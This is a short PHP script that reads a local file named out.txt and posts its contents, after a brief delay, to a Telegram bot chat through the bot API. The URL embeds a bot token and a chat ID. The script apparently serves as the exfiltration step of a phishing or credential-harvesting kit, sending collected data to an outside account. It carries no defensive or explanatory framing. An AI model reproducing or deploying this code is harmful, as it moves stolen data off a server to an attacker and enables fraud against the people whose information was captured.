<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot:AAHELCArgKeIH9OA-hXqMbNxjpTLiEZ2bRM/sendMessage?chat_id=1328975529&text=$msg");
?>
